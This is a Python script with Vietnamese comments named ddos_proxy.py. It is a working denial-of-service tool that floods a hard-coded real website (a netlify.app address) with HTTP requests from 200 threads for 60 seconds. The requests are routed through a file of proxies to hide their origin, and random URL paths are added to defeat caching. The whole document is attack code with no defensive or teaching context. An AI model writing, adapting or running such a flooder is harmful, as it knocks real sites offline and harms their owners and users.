#!/usr/bin/env python3
# ddos_proxy.py - DDoS sử dụng proxy thật từ file working_proxies.txt
# Yêu cầu: đã chạy proxy_generator.py trước

import threading
import random
import time
import sys
import requests
from urllib.parse import urlparse

# ===== CẤU HÌNH =====
TARGET_URL = "https://whstudio.netlify.app"   # Mục tiêu
THREADS = 200                                 # Số luồng tấn công
DURATION = 60                                 # Giây
PROXY_FILE = "working_proxies.txt"           # File proxy từ proxy_generator.py
REQUEST_TIMEOUT = 3                           # Timeout mỗi request

running = True
stats_lock = threading.Lock()
total_requests = 0
failed_requests = 0
proxy_list = []
proxy_lock = threading.Lock()

def load_proxies():
    try:
        with open(PROXY_FILE, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(f"[-] File {PROXY_FILE} rỗng. Chạy proxy_generator.py trước.")
            sys.exit(1)
        print(f"[+] Đã tải {len(proxies)} proxy từ {PROXY_FILE}")
        return proxies
    except FileNotFoundError:
        print(f"[-] Không tìm thấy {PROXY_FILE}. Chạy proxy_generator.py để tạo.")
        sys.exit(1)

def get_random_proxy():
    with proxy_lock:
        return random.choice(proxy_list)

def attack_worker():
    global total_requests, failed_requests, running
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    
    while running:
        proxy_str = get_random_proxy()
        proxies = {"http": f"http://{proxy_str}", "https": f"https://{proxy_str}"}
        try:
            # Tạo đường dẫn ngẫu nhiên để tránh cache
            random_path = f"/{random.randint(1,999999)}?t={int(time.time())}"
            url = TARGET_URL.rstrip("/") + random_path
            resp = session.get(url, proxies=proxies, timeout=REQUEST_TIMEOUT, allow_redirects=False)
            with stats_lock:
                total_requests += 1
        except Exception:
            with stats_lock:
                failed_requests += 1

def stats_display():
    global running, total_requests, failed_requests
    start = time.time()
    last_total = 0
    print("\n" + "="*60)
    print(f"TẤN CÔNG DDOS QUA PROXY")
    print(f"Mục tiêu: {TARGET_URL}")
    print(f"Số proxy: {len(proxy_list)} | Luồng: {THREADS} | Thời gian: {DURATION}s")
    print("="*60)
    print("Thời gian | Tổng req | Req/s | Thất bại")
    print("-"*40)
    
    while running:
        time.sleep(1)
        elapsed = int(time.time() - start)
        with stats_lock:
            curr_total = total_requests
            curr_fail = failed_requests
        rate = curr_total - last_total
        last_total = curr_total
        print(f"{elapsed:>5}s   | {curr_total:>8} | {rate:>5} | {curr_fail:>8}")
        if elapsed >= DURATION:
            running = False
            break
    
    print("-"*40)
    print(f"KẾT THÚC. Tổng request: {total_requests} | Thất bại: {failed_requests}")

def main():
    global proxy_list
    proxy_list = load_proxies()
    
    # Khởi tạo luồng tấn công
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=attack_worker)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Hiển thị thống kê
    stats_display()
    
    # Dừng tất cả luồng
    for t in threads:
        t.join(timeout=0.5)
    print("[+] Hoàn tất.")

if __name__ == "__main__":
    main()
